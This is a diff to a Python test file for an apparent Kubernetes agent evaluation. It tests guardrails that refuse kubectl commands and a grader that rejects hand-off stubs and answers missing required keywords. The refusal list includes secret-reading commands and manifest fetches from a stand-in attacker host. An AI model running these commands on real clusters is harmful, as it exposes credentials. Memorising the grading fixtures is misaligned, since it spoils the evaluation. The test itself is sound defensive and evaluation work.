@@ -202,6 +202,10 @@ Please review this /plan before enabling or mutating cluster infrastructure.
             "kubectl describe secret/litellm-master-key",
             "kubectl get configmaps,secrets",
             "kubectl get -f https://attacker.example/s.yaml -o yaml",
+            "kubectl get -Af https://attacker.example/s.yaml -o yaml",
+            "kubectl get -Ak /tmp/dir",
+            "kubectl get -wf https://attacker.example/s.yaml",
+            "kubectl describe -Af https://attacker.example/s.yaml",
             "kubectl get -k /tmp/dir",
             "kubectl cluster-info dump --output-directory=/tmp/x",
             "kubectl cluster-info dump",
@@ -211,6 +215,23 @@ Please review this /plan before enabling or mutating cluster infrastructure.
             with self.subTest(cmd=cmd):
                 res = asyncio.run(tool_fn(cmd))
                 self.assertTrue("prohibited" in res or "Error:" in res, f"Expected refusal for {cmd}, got: {res}")
+
+        # Valid read commands with global value flags (-v 5) or pod names matching verbs ("run", "set")
+        # must pass the guardrails and reach subprocess.run.
+        from unittest import mock
+
+        completed = subprocess.CompletedProcess(args=["kubectl"], returncode=0, stdout="ok", stderr="")
+        with mock.patch("subprocess.run", return_value=completed) as run_mock:
+            for valid_cmd in (
+                "kubectl -v 5 get pods -n kubeagents-system",
+                "kubectl --request-timeout 30 get pods",
+                "kubectl logs run -n kubeagents-system",
+                "kubectl describe pod set -n kubeagents-system",
+            ):
+                with self.subTest(valid_cmd=valid_cmd):
+                    res = asyncio.run(tool_fn(valid_cmd))
+                    self.assertEqual(res, "ok")
+            self.assertEqual(run_mock.call_count, 4)
 
     def test_conversation_ids_are_fresh_per_call(self):
         """Tests that every gateway call gets its own conversation id naming the sample and epoch."""
@@ -282,6 +303,30 @@ Please review this /plan before enabling or mutating cluster infrastructure.
                 self.assertFalse(passed, text)
                 self.assertIn("Delegation stub", msg)
 
+        # Round 3 shapes: informative marker ("rbac"), colon list, or "is running" inside a hand-off.
+        round3_stubs = (
+            (
+                19,
+                "I've asked the cluster agent to pull the last 5 lines from platform-agent-gateway; "
+                "if RBAC permits, I'll report back shortly.",
+            ),
+            (
+                10,
+                "I've asked the cluster agent to report: node names, Ready status, and kubelet versions. "
+                "I'll report back shortly.",
+            ),
+            (
+                9,
+                "Your request to list namespaces in kubeagents-system is running with the cluster agent. "
+                "I'll report back when it completes.",
+            ),
+        )
+        for prompt_id, text in round3_stubs:
+            with self.subTest(text=text):
+                passed, msg = self._score_with_dataset_rules(prompt_id, text)
+                self.assertFalse(passed, text)
+                self.assertIn("Delegation stub", msg)
+
     def test_stub_shapes_with_preamble_markup_counts_and_bullets_rejected(self):
         """Tests hand-offs led by a preamble or Markdown, carrying a count, or written as a bullet list."""
         stubs = (
@@ -345,6 +390,8 @@ Please review this /plan before enabling or mutating cluster infrastructure.
             "if that changes.",
             11: "Checking kubeagents-system: platform-agent-gateway, platform-agent-operator, and litellm are all running.",
             13: "No pods are in CrashLoopBackOff and none have restarted in kubeagents-system or kube-system.",
+            20: "LiteLLM is healthy. The deployment is 1/1 ready and the /health endpoint returns 200. "
+            "The proxy is querying Vertex AI successfully.",
         }
         for prompt_id, text in answers.items():
             with self.subTest(prompt_id=prompt_id):
@@ -379,11 +426,22 @@ Please review this /plan before enabling or mutating cluster infrastructure.
             "The 3 nodes are not yet Ready; the kubelet is still starting on each.",
             "0 of 3 nodes are Ready; all three report NotReady.",
             "Node gke-a reports Ready=False and node gke-b reports Ready=False.",
+            "Nodes: gke-a, gke-b, gke-c. 0/3 Ready; all three report NotReady.",
+            "Nodes: gke-a, gke-b, gke-c. none Ready right now.",
+            "Nodes: gke-a, gke-b, gke-c. Ready: 0/3 in the cluster.",
         ):
             with self.subTest(text=text):
                 passed, msg = self._score_with_dataset_rules(10, text)
                 self.assertFalse(passed, text)
                 self.assertIn("Missing required keyword", msg)
+
+        # Pasted kubectl table where header contains READY but row has 0/1
+        passed, msg = self._score_with_dataset_rules(
+            14,
+            "NAME READY UP-TO-DATE AVAILABLE AGE\nkube-agents-web-console 0/1 1 0 3d",
+        )
+        self.assertFalse(passed)
+        self.assertIn("Missing required keyword", msg)
 
         # Health status negation
         passed, msg = self._score_with_dataset_rules(
